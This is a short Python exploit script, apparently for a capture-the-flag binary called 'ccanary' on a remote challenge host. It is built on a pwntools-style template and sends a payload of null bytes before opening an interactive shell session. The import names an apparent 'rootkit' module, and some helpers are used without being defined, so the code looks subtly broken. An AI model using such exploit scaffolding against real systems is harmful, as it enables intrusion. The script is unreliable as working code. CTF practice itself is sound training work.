#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./ccanary')

host = args.HOST or 'chall.rootkitable.tw'
port = int(args.PORT or 10306)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *main+102
c
continue
'''.format(**locals())

# -- Exploit goes here --
def send_inp(inp):
    sla("> ", inp)

io = start()
send_inp("\x00"*18 + "\n")
try:
    io.recv()
except:
    pass
try:
    re()
except:
    pass
io.interactive()